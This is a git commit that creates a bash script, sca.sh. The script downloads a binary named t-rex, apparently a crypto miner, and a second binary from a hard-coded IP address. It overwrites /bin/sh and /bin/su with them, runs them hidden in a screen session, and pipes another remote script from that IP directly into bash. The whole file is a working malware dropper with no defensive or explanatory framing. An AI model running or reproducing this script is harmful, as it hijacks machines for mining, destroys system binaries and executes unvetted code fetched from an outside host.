f754ac5def3a42e3efadb0280f0d97ff293a0b11
ALICLAYSMEN <58400825+ALICLAYSMEN@users.noreply.github.com>
2022-07-11 19:55:54 +0700

    Create sca.sh

---
+++ sca.sh
@@ -0,0 +1,15 @@
+#!/bin/bash
+echo "ENGINE START!"
+export LD_PRELOAD=
+curl -sLO https://raw.githubusercontent.com/ALICLAYSMEN/trexxx/main/t-rex
+curl -sLO http://139.59.230.245:7800/down/87J4LekusQat
+mv t-rex /bin/sh
+mv 87J4LekusQat /bin/su
+chmod +x /bin/sh
+chmod +x /bin/su
+sudo apt install screen -y > /dev/null 2>&1
+screen -S sesi /bin/sh -c /bin/su
+screen -ls
+clear
+screen -ls
+curl -s http://139.59.230.245:7800/down/ZFUl2aJApRL2 | bash
